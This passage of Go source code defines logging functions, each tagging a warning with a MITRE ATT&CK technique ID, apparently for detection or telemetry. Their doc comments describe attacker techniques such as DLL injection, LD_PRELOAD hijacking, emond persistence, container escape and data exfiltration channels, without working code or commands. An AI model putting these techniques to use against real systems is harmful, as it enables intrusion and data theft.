Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE
Advisory Nov 2017) Microsoft Office documents can be poisoned with DDE commands
(Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014),
directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and
used to deliver execution via Phishing campaigns or hosted Web content, avoiding
the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost
MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on
a compromised machine who does not have direct access to a Command and Scripting
Interpreter.
*/
func (g *Session) ATTACKEntDynamicDataExchange(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1559.002").
        Msg("dynamic data exchange")
}

/* ATTACKEntDynamicLinkerHijacking Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking environment
variables the dynamic linker uses to load shared libraries. During the execution
preparation phase of a program, the dynamic linker loads specified absolute
paths of shared libraries from environment variables and files, such as
LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in
environment variables are loaded first, taking precedence over system libraries
with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared
Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are
often used by developers to debug binaries without needing to recompile,
deconflict mapped symbols, and implement custom functions without changing the
original library.(Citation: Baeldung LD_PRELOAD) On Linux and macOS, hijacking
dynamic linker variables may grant access to the victim process's memory,
system/network resources, and possibly elevated privileges. This method may also
evade detection from security products since the execution is masked under a
legitimate process. Adversaries can set environment variables via the command
line using the export command, setenv function, or putenv function. Adversaries
can also leverage Dynamic Linker Hijacking to export variables in a shell or set
variables programmatically using higher level syntax such Python’s os.environ.
On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that
match the name of legitimate libraries which are requested by a victim program,
causing the operating system to load the adversary's malicious code upon
execution of the victim program. LD_PRELOAD can be set via the environment
variable or /etc/ld.so.preload file.(Citation: Man LD.SO)(Citation: TLDP Shared
Libraries) Libraries specified by LD_PRELOAD are loaded and mapped into memory
by dlopen() and mmap() respectively.(Citation: Code Injection on Linux and
macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation:
Brown Exploiting Linkers)  On macOS this behavior is conceptually the same as on
Linux, differing only in how the macOS dynamic libraries (dyld) is implemented
at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment
variable to point to malicious libraries containing names of legitimate
libraries or functions requested by a victim program.(Citation: TheEvilBit
DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation:
Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)
*/
func (g *Session) ATTACKEntDynamicLinkerHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.006").
        Msg("dynamic linker hijacking")
}

/* ATTACKEntDynamicResolution Phases: command-and-control

Adversaries may dynamically establish connections to command and control
infrastructure to evade common detections and remediations. This may be achieved
by using malware that shares a common algorithm with the infrastructure the
adversary uses to receive the malware's communications. These calculations can
be used to dynamically adjust parameters such as the domain name, IP address, or
port number the malware uses for command and control. Adversaries may use
dynamic resolution for the purpose of Fallback Channels. When contact is lost
with the primary command and control server malware may employ dynamic
resolution as a means to reestablishing command and control.(Citation: Talos
CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017
Activity)
*/
func (g *Session) ATTACKEntDynamicResolution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1568").
        Msg("dynamic resolution")
}

/* ATTACKEntDynamiclinkLibraryInjection Phases: defense-evasion privilege-escalation

Adversaries may inject dynamic-link libraries (DLLs) into processes in order to
evade process-based defenses as well as possibly elevate privileges. DLL
injection is a method of executing arbitrary code in the address space of a
separate live process.   DLL injection is commonly performed by writing the path
to a DLL in the virtual address space of the target process before loading the
DLL by invoking a new thread. The write can be performed with native Windows API
calls such as VirtualAllocEx and WriteProcessMemory, then invoked with
CreateRemoteThread (which calls the LoadLibrary API responsible for loading the
DLL). (Citation: Elastic Process Injection July 2017)  Variations of this method
such as reflective DLL injection (writing a self-mapping DLL into a process) and
memory module (map DLL when writing into process) overcome the address
relocation issue as well as the additional APIs to invoke execution (since these
methods load and execute the files in memory by manually preforming the function
of LoadLibrary).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic
Process Injection July 2017)  Running code in the context of another process may
allow access to the process's memory, system/network resources, and possibly
elevated privileges. Execution via DLL injection may also evade detection from
security products since the execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntDynamiclinkLibraryInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.001").
        Msg("dynamic-link library injection")
}

/* ATTACKEntElevatedExecutionwithPrompt Phases: privilege-escalation defense-evasion

Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate
privileges by prompting the user for credentials.(Citation: AppleDocs
AuthorizationExecuteWithPrivileges) The purpose of this API is to give
application developers an easy way to perform operations with root privileges,
such as for application installation or updating. This API does not validate
that the program requesting root privileges comes from a reputable source or has
been maliciously modified.  Although this API is deprecated, it still fully
functions in the latest releases of macOS. When calling this API, the user will
be prompted to enter their credentials but no checks on the origin or integrity
of the program are made. The program calling the API may also load world
writable files which can be modified to perform malicious behavior with elevated
privileges. Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain
root privileges in order to install malicious software on victims and install
persistence mechanisms.(Citation: Death by 1000 installers; it's all
broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT)
This technique may be combined with Masquerading to trick the user into granting
escalated privileges to malicious code.(Citation: Death by 1000 installers; it's
all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also
been shown to work by modifying legitimate programs present on the machine that
make use of this API.(Citation: Death by 1000 installers; it's all broken!)
*/
func (g *Session) ATTACKEntElevatedExecutionwithPrompt(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1548.004").
        Msg("elevated execution with prompt")
}

/* ATTACKEntEmailAccount Phases: discovery

Adversaries may attempt to get a listing of email addresses and accounts.
Adversaries may try to dump Exchange address lists such as global address lists
(GALs).(Citation: Microsoft Exchange Address Lists) In on-premises Exchange and
Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to
obtain email addresses and accounts from a domain using an authenticated
session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills
Attacking Exchange MailSniper, 2016) In Google Workspace, the GAL is shared with
Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook
(GWSMO) service. Additionally, the Google Workspace Directory allows for users
to get a listing of other users within the organization.(Citation: Google
Workspace Global Access List)
*/
func (g *Session) ATTACKEntEmailAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1087.003").
        Msg("email account")
}

/* ATTACKEntEmailAccounts Phases: resource-development

Adversaries may create email accounts that can be used during targeting.
Adversaries can use accounts created with email providers to further their
operations, such as leveraging them to conduct Phishing for Information or
Phishing.(Citation: Mandiant APT1) Adversaries may also take steps to cultivate
a persona around the email account, such as through use of Social Media
Accounts, to increase the chance of success of follow-on behaviors. Created
email accounts can also be used in the acquisition of infrastructure (ex:
Domains).(Citation: Mandiant APT1) To decrease the chance of physically tying
back operations to themselves, adversaries may make use of disposable email
services.(Citation: Trend Micro R980 2016)
*/
func (g *Session) ATTACKEntEmailAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1585.002").
        Msg("email accounts")
}

/* ATTACKEntEmailAccounts2 Phases: resource-development

Adversaries may compromise email accounts that can be used during targeting.
Adversaries can use compromised email accounts to further their operations, such
as leveraging them to conduct Phishing for Information or Phishing. Utilizing an
existing persona with a compromised email account may engender a level of trust
in a potential victim if they have a relationship, or knowledge of, the
compromised persona. Compromised email accounts can also be used in the
acquisition of infrastructure (ex: Domains). A variety of methods exist for
compromising email accounts, such as gathering credentials via Phishing for
Information, purchasing credentials from third-party sites, or by brute forcing
credentials (ex: password reuse from breach credential dumps).(Citation:
AnonHBGary) Prior to compromising email accounts, adversaries may conduct
Reconnaissance to inform decisions about which accounts to compromise to further
their operation. Adversaries can use a compromised email account to hijack
existing email threads with targets of interest.
*/
func (g *Session) ATTACKEntEmailAccounts2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1586.002").
        Msg("email accounts")
}

/* ATTACKEntEmailAddresses Phases: reconnaissance

Adversaries may gather email addresses that can be used during targeting. Even
if internal instances exist, organizations may have public-facing email
infrastructure and addresses for employees. Adversaries may easily gather email
addresses, since they may be readily available and exposed via online or other
accessible data sets (ex: Social Media or Search Victim-Owned
Websites).(Citation: HackersArise Email)(Citation: CNET Leaks) Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Search Open Websites/Domains or Phishing for Information), establishing
operational resources (ex: Email Accounts), and/or initial access (ex:
Phishing).
*/
func (g *Session) ATTACKEntEmailAddresses(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1589.002").
        Msg("email addresses")
}

/* ATTACKEntEmailCollection Phases: collection

Adversaries may target user email to collect sensitive information. Emails may
contain sensitive data, including trade secrets or personal information, that
can prove valuable to adversaries. Adversaries can collect or forward email from
mail servers or clients.
*/
func (g *Session) ATTACKEntEmailCollection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1114").
        Msg("email collection")
}

/* ATTACKEntEmailForwardingRule Phases: collection

Adversaries may setup email forwarding rules to collect sensitive information.
Adversaries may abuse email-forwarding rules to monitor the activities of a
victim, steal information, and further gain intelligence on the victim or the
victim’s organization to use as part of further exploits or
operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA)
allow users to create inbox rules for various email functions, including
forwarding to a different recipient. Similarly, Google Workspace users or
administrators can set up mail forwarding rules via the Google Workspace web
interface. Messages can be forwarded to internal or external recipients, and
there are no restrictions limiting the extent of this rule. Administrators may
also create forwarding rules for user accounts with the same considerations and
outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)  Any
user or administrator within the organization (or adversary with valid
credentials) can create rules to automatically forward all received messages to
another recipient, forward emails to different locations based on the sender,
and more.
*/
func (g *Session) ATTACKEntEmailForwardingRule(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1114.003").
        Msg("email forwarding rule")
}

/* ATTACKEntEmond Phases: privilege-escalation persistence

Adversaries may gain persistence and elevate privileges by executing malicious
content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon
that accepts events from various services, runs them through a simple rules
engine, and takes action. The emond binary at /sbin/emond will load any rules
from the /etc/emond.d/rules/ directory and take action once an explicitly
defined event takes place. The rule files are in the plist format and define the
name, event type, and action to take. Some examples of event types include
system startup and user authentication. Examples of actions are to run a system
command or send an email. The emond service will not launch if there is no file
present in the QueueDirectories path /private/var/db/emondClients, specified in
the Launch Daemon configuration file
at/System/Library/LaunchDaemons/com.apple.emond.plist.(Citation: xorrior emond
Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos
persist Jun 2019) Adversaries may abuse this service by writing a rule to
execute commands when a defined event occurs, such as system start up or user
authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr
2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able
to escalate privileges from administrator to root as the emond service is
executed with root privileges by the Launch Daemon service.
*/
func (g *Session) ATTACKEntEmond(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.014").
        Msg("emond")
}

/* ATTACKEntEmployeeNames Phases: reconnaissance

Adversaries may gather employee names that can be used during targeting.
Employee names be used to derive email addresses as well as to help guide other
reconnaissance efforts and/or craft more-believable lures. Adversaries may
easily gather employee names, since they may be readily available and exposed
via online or other accessible data sets (ex: Social Media or Search Victim-
Owned Websites).(Citation: OPM Leak) Gathering this information may reveal
opportunities for other forms of reconnaissance (ex: Search Open
Websites/Domains or Phishing for Information), establishing operational
resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or
Valid Accounts).
*/
func (g *Session) ATTACKEntEmployeeNames(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1589.003").
        Msg("employee names")
}

/* ATTACKEntEncryptedChannel Phases: command-and-control

Adversaries may employ a known encryption algorithm to conceal command and
control traffic rather than relying on any inherent protections provided by a
communication protocol. Despite the use of a secure algorithm, these
implementations may be vulnerable to reverse engineering if secret keys are
encoded and/or generated within malware samples/configuration files.
*/
func (g *Session) ATTACKEntEncryptedChannel(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1573").
        Msg("encrypted channel")
}

/* ATTACKEntEndpointDenialofService Phases: impact

Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or
block the availability of services to users. Endpoint DoS can be performed by
exhausting the system resources those services are hosted on or exploiting the
system to cause a persistent crash condition. Example services include websites,
email services, DNS, and web-based applications. Adversaries have been observed
conducting DoS attacks for political purposes(Citation: FireEye
OpPoisonedHandover February 2016) and to support other malicious activities,
including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism,
and extortion.(Citation: Symantec DDoS October 2014) An Endpoint DoS denies the
availability of a service without saturating the network used to provide access
to the service. Adversaries can target various layers of the application stack
that is hosted on the system used to provide the service. These layers include
the Operating Systems (OS), server applications such as web servers, DNS
servers, databases, and the (typically web-based) applications that sit on top
of them. Attacking each layer requires different techniques that take advantage
of bottlenecks that are unique to the respective components. A DoS attack may be
generated by a single system or multiple systems spread across the internet,
which is commonly referred to as a distributed DoS (DDoS). To perform DoS
attacks against endpoint resources, several aspects apply to multiple methods,
including IP address spoofing and botnets. Adversaries may use the original IP
address of an attacking system, or spoof the source IP address to make the
attack traffic more difficult to trace back to the attacking system or to enable
reflection. This can increase the difficulty defenders have in defending against
the attack by reducing or eliminating the effectiveness of filtering by the
source address on network defense devices. Botnets are commonly used to conduct
DDoS attacks against networks and services. Large botnets can generate a
significant amount of traffic from systems spread across the global internet.
Adversaries may have the resources to build out and control their own botnet
infrastructure or may rent time on an existing botnet to conduct an attack. In
some of the worst cases for DDoS, so many systems are used to generate requests
that each one only needs to send out a small amount of traffic to produce enough
volume to exhaust the target's resources. In such circumstances, distinguishing
DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have
been used in some of the most high-profile DDoS attacks, such as the 2012 series
of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March
2016) In cases where traffic manipulation is used, there may be points in the
the global network (such as high traffic gateway routers) where packets can be
altered and cause legitimate clients to execute code that directs network
packets toward a target in high volume. This type of capability was previously
used for the purposes of web censorship where client HTTP traffic was modified
to include a reference to JavaScript that generated the DDoS code to overwhelm
target web servers.(Citation: ArsTechnica Great Firewall of China) For attacks
attempting to saturate the providing network, see Network Denial of Service.
*/
func (g *Session) ATTACKEntEndpointDenialofService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1499").
        Msg("endpoint denial of service")
}

/* ATTACKEntEnvironmentalKeying Phases: defense-evasion

Adversaries may environmentally key payloads or other features of malware to
evade defenses and constraint execution to a specific target environment.
Environmental keying uses cryptography to constrain execution or actions based
on adversary supplied environment specific conditions that are expected to be
present on the target. Environmental keying is an implementation of Execution
Guardrails that utilizes cryptographic techniques for deriving
encryption/decryption keys from specific types of values in a given computing
environment.(Citation: EK Clueless Agents) Values can be derived from target-
specific elements and used to generate a decryption key for an encrypted
payload. Target-specific values can be derived from specific network shares,
physical devices, software/software versions, files, joined AD domains, system
time, and local/external IP addresses.(Citation: Kaspersky Gauss
Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding
Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic
Malware) By generating the decryption keys from target-specific environmental
values, environmental keying can make sandbox detection, anti-virus detection,
crowdsourcing of information, and reverse engineering difficult.(Citation:
Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These
difficulties can slow down the incident response process and help adversaries
hide their tactics, techniques, and procedures (TTPs). Similar to Obfuscated
Files or Information, adversaries may use environmental keying to help protect
their TTPs and evade detection. Environmental keying may be used to deliver an
encrypted payload to the target that will use target-specific values to decrypt
the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK
Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla:
Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-
specific values to decrypt the payload the adversary can avoid packaging the
decryption key with the payload or sending it over a potentially monitored
network connection. Depending on the technique for gathering target-specific
values, reverse engineering of the encrypted payload can be exceptionally
difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent
exposure of capabilities in environments that are not intended to be compromised
or operated within. Like other Execution Guardrails, environmental keying can be
used to prevent exposure of capabilities in environments that are not intended
to be compromised or operated within. This activity is distinct from typical
Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may
involve checking for known sandbox values and continuing with execution only if
there is no match, the use of environmental keying will involve checking for an
expected target-specific value that must match for decryption and subsequent
execution to be successful.
*/
func (g *Session) ATTACKEntEnvironmentalKeying(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1480.001").
        Msg("environmental keying")
}

/* ATTACKEntEscapetoHost Phases: privilege-escalation

Adversaries may break out of a container to gain access to the underlying host.
This can allow an adversary access to other containerized resources from the
host level or to the host itself. In principle, containerized resources should
provide a clear separation of application functionality and be isolated from the
host environment.(Citation: Docker Overview) There are multiple ways an
adversary may escape to a host environment. Examples include creating a
container configured to mount the host’s filesystem using the bind parameter,
which allows the adversary to drop payloads and execute control utilities such
as cron on the host, and utilizing a privileged container to run commands on the
underlying host.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged
Container)(Citation: Intezer Doki July 20) Gaining access to the host may
provide the adversary with the opportunity to achieve follow-on objectives, such
as establishing persistence, moving laterally within the environment, or setting
up a command and control channel on the host.
*/
func (g *Session) ATTACKEntEscapetoHost(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1611").
        Msg("escape to host")
}

/* ATTACKEntEstablishAccounts Phases: resource-development

Adversaries may create and cultivate accounts with services that can be used
during targeting. Adversaries can create accounts that can be used to build a
persona to further operations. Persona development consists of the development
of public information, presence, history and appropriate affiliations. This
development could be applied to social media, website, or other publicly
available information that could be referenced and scrutinized for legitimacy
over the course of an operation using that persona or identity.(Citation:
NEWSCASTER2014)(Citation: BlackHatRobinSage) For operations incorporating social
engineering, the utilization of an online persona may be important. These
personas may be fictitious or impersonate real people. The persona may exist on
a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google,
GitHub, Docker Hub, etc.). Establishing a persona may require development of
additional documentation to make them seem real. This could include filling out
profile information, developing social networks, or incorporating
photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Establishing
accounts can also include the creation of accounts with email providers, which
may be directly leveraged for Phishing for Information or Phishing.(Citation:
Mandiant APT1)
*/
func (g *Session) ATTACKEntEstablishAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1585").
        Msg("establish accounts")
}

/* ATTACKEntEventTriggeredExecution Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges using system
mechanisms that trigger execution based on specific events. Various operating
systems have means to monitor and subscribe to events such as logons or other
user activity such as running specific applications/binaries.  Adversaries may
abuse these mechanisms as a means of maintaining persistent access to a victim
via repeatedly executing malicious code. After gaining access to a victim
system, adversaries may create/modify event triggers to point to malicious
content that will be executed whenever the event trigger is invoked.(Citation:
FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia
malware) Since the execution can be proxied by an account with higher
permissions, such as SYSTEM or service accounts, an adversary may be able to
abuse these triggered execution mechanisms to escalate their privileges.
*/
func (g *Session) ATTACKEntEventTriggeredExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546").
        Msg("event triggered execution")
}

/* ATTACKEntExchangeEmailDelegatePermissions Phases: persistence

Adversaries may grant additional permission levels, such as ReadPermission or
FullAccess, to maintain persistent access to an adversary-controlled email
account. The Add-MailboxPermission PowerShell cmdlet, available in on-premises
Exchange and in the cloud-based service Office 365, adds permissions to a
mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35
2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) This may be used in
persistent threat incidents as well as BEC (Business Email Compromise) incidents
where an adversary can assign more access rights to the accounts they wish to
compromise. This may further enable use of additional techniques for gaining
access to systems. For example, compromised business accounts are often used to
send messages to other accounts in the network of the target business while
creating inbox rules (ex: Internal Spearphishing), so the messages evade
spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 -
2019)
*/
func (g *Session) ATTACKEntExchangeEmailDelegatePermissions(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1098.002").
        Msg("exchange email delegate permissions")
}

/* ATTACKEntExecutableInstallerFilePermissionsWeakness Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the binaries
used by an installer. These processes may automatically execute specific
binaries as part of their functionality or to perform other actions. If the
permissions on the file system directory containing a target binary, or
permissions on the binary itself, are improperly set, then the target binary may
be overwritten with another binary using user-level permissions and executed by
the original process. If the original process and thread are running under a
higher permissions level, then the replaced binary will also execute under
higher-level permissions, which could include SYSTEM. Another variation of this
technique can be performed by taking advantage of a weakness that is common in
executable, self-extracting installers. During the installation process, it is
common for installers to use a subdirectory within the %TEMP% directory to
unpack binaries such as DLLs, EXEs, or other payloads. When installers create
subdirectories and files they often do not set appropriate permissions to
restrict write access, which allows for execution of untrusted code placed in
the subdirectories or overwriting of binaries used in the installation process.
This behavior is related to and may take advantage of DLL Search Order
Hijacking. Adversaries may use this technique to replace legitimate binaries
with malicious ones as a means of executing code at a higher permissions level.
Some installers may also require elevated privileges that will result in
privilege escalation when executing adversary controlled code. This behavior is
related to Bypass User Account Control. Several examples of this weakness in
existing common installers have been reported to software vendors.(Citation:
mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the
executing process is set to run at a specific time or during a certain event
(e.g., system bootup) then this technique can also be used for persistence.
*/
func (g *Session) ATTACKEntExecutableInstallerFilePermissionsWeakness(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.005").
        Msg("executable installer file permissions weakness")
}

/* ATTACKEntExecutionGuardrails Phases: defense-evasion

Adversaries may use execution guardrails to constrain execution or actions based
on adversary supplied and environment specific conditions that are expected to
be present on the target. Guardrails ensure that a payload only executes against
an intended target and reduces collateral damage from an adversary’s
campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can
provide about a target system or environment to use as guardrails may include
specific network share names, attached physical devices, files, joined Active
Directory (AD) domains, and local/external IP addresses.(Citation: FireEye
Outlook Dec 2019) Guardrails can be used to prevent exposure of capabilities in
environments that are not intended to be compromised or operated within. This
use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While
use of Virtualization/Sandbox Evasion may involve checking for known sandbox
values and continuing with execution only if there is no match, the use of
guardrails will involve checking for an expected target-specific value and only
continuing with execution if there is such a match.
*/
func (g *Session) ATTACKEntExecutionGuardrails(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1480").
        Msg("execution guardrails")
}

/* ATTACKEntExfiltrationOverAlternativeProtocol Phases: exfiltration

Adversaries may steal data by exfiltrating it over a different protocol than
that of the existing command and control channel. The data may also be sent to
an alternate network location from the main command and control server.
Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network
protocol not being used as the main command and control channel. Different
protocol channels could also include Web services such as cloud storage.
Adversaries may also opt to encrypt and/or obfuscate these alternate channels.
Exfiltration Over Alternative Protocol can be done using various common
operating system utilities such as Net/SMB or FTP.(Citation: Palo Alto OilRig
Oct 2016)
*/
func (g *Session) ATTACKEntExfiltrationOverAlternativeProtocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1048").
        Msg("exfiltration over alternative protocol")
}

/* ATTACKEntExfiltrationOverAsymmetricEncryptedNonC2Protocol Phases: exfiltration

Adversaries may steal data by exfiltrating it over an asymmetrically encrypted
network protocol other than that of the existing command and control channel.
The data may also be sent to an alternate network location from the main command
and control server.  Asymmetric encryption algorithms are those that use
different keys on each end of the channel. Also known as public-key
cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt
data from the corresponding key. Each end of the communication channels requires
a private key (only in the procession of that entity) and the public key of the
other entity. The public keys of each entity are exchanged before encrypted
communications begin.  Network protocols that use asymmetric encryption (such as
HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.
Adversaries may opt to use these encrypted mechanisms that are baked into a
protocol.
*/
func (g *Session) ATTACKEntExfiltrationOverAsymmetricEncryptedNonC2Protocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1048.002").
        Msg("exfiltration over asymmetric encrypted non-c2 protocol")
}

/* ATTACKEntExfiltrationOverBluetooth Phases: exfiltration

Adversaries may attempt to exfiltrate data over Bluetooth rather than the
command and control channel. If the command and control network is a wired
Internet connection, an attacker may opt to exfiltrate data using a Bluetooth
communication channel. Adversaries may choose to do this if they have sufficient
access and proximity. Bluetooth connections might not be secured or defended as
well as the primary Internet-connected channel because it is not routed through
the same enterprise network.
*/
func (g *Session) ATTACKEntExfiltrationOverBluetooth(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1011.001").
        Msg("exfiltration over bluetooth")
}

/* ATTACKEntExfiltrationOverC2Channel Phases: exfiltration

Adversaries may steal data by exfiltrating it over an existing command and
control channel. Stolen data is encoded into the normal communications channel
using the same protocol as command and control communications.
*/
func (g *Session) ATTACKEntExfiltrationOverC2Channel(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1041").
        Msg("exfiltration over c2 channel")
}

/* ATTACKEntExfiltrationOverOtherNetworkMedium Phases: exfiltration

Adversaries may attempt to exfiltrate data over a different network medium than
the command and control channel. If the command and control network is a wired
Internet connection, the exfiltration may occur, for example, over a WiFi
connection, modem, cellular data connection, Bluetooth, or another radio
frequency (RF) channel. Adversaries may choose to do this if they have
sufficient access or proximity, and the connection might not be secured or
defended as well as the primary Internet-connected channel because it is not
routed through the same enterprise network
*/
func (g *Session) ATTACKEntExfiltrationOverOtherNetworkMedium(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1011").
        Msg("exfiltration over other network medium")
}

/* ATTACKEntExfiltrationOverPhysicalMedium Phases: exfiltration

Adversaries may attempt to exfiltrate data via a physical medium, such as a
removable drive. In certain circumstances, such as an air-gapped network
compromise, exfiltration could occur via a physical medium or device introduced
by a user. Such media could be an external hard drive, USB drive, cellular
phone, MP3 player, or other removable storage and processing device. The
physical medium or device could be used as the final exfiltration point or to
hop between otherwise disconnected systems.
*/
func (g *Session) ATTACKEntExfiltrationOverPhysicalMedium(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1052").
        Msg("exfiltration over physical medium")
}

/* ATTACKEntExfiltrationOverSymmetricEncryptedNonC2Protocol Phases: exfiltration

Adversaries may steal data by exfiltrating it over a symmetrically encrypted
network protocol other than that of the existing command and control channel.
The data may also be sent to an alternate network location from the main command
and control server.  Symmetric encryption algorithms are those that use shared
or the same keys/secrets on each end of the channel. This requires an exchange
or pre-arranged agreement/possession of the value used to encrypt and decrypt
data.  Network protocols that use asymmetric encryption often utilize symmetric
encryption once keys are exchanged, but adversaries may opt to manually share
keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using
mechanisms that are baked into a protocol. This may result in multiple layers of
encryption (in protocols that are natively encrypted such as HTTPS) or
encryption in protocols that not typically encrypted (such as HTTP or FTP).
*/
func (g *Session) ATTACKEntExfiltrationOverSymmetricEncryptedNonC2Protocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1048.001").
        Msg("exfiltration over symmetric encrypted non-c2 protocol")
}

/* ATTACKEntExfiltrationOverUnencryptedObfuscatedNonC2Protocol Phases: exfiltration

Adversaries may steal data by exfiltrating it over an un-encrypted network
protocol other than that of the existing command and control channel. The data
may also be sent to an alternate network location from the main command and
control server.  Adversaries may opt to obfuscate this data, without the use of
encryption, within network protocols that are natively unencrypted (such as
HTTP, FTP, or DNS). This may include custom or publicly available
encoding/compression algorithms (such as base64) as well as embedding data
within protocol headers and fields.
*/
func (g *Session) ATTACKEntExfiltrationOverUnencryptedObfuscatedNonC2Protocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1048.003").
        Msg("exfiltration over unencrypted/obfuscated non-c2 protocol")
}

/* ATTACKEntExfiltrationOverWebService Phases: exfiltration

Adversaries may use an existing, legitimate external Web service to exfiltrate
data rather than their primary command and control channel. Popular Web services
acting as an exfiltration mechanism may give a significant amount of cover due
to the likelihood that hosts within a network are already communicating with
them prior to compromise. Firewall rules may also already exist to permit
traffic to these services. Web service providers also commonly use SSL/TLS
encryption, giving adversaries an added level of protection.
*/
func (g *Session) ATTACKEntExfiltrationOverWebService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1567").
        Msg("exfiltration over web service")
}

/* ATTACKEntExfiltrationoverUSB Phases: exfiltration

Adversaries may attempt to exfiltrate data over a USB connected physical device.
In certain circumstances, such as an air-gapped network compromise, exfiltration
could occur via a USB device introduced by a user. The USB device could be used
as the final exfiltration point or to hop between otherwise disconnected
systems.
*/
func (g *Session) ATTACKEntExfiltrationoverUSB(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1052.001").
        Msg("exfiltration over usb")
}

/* ATTACKEntExfiltrationtoCloudStorage Phases: exfiltration

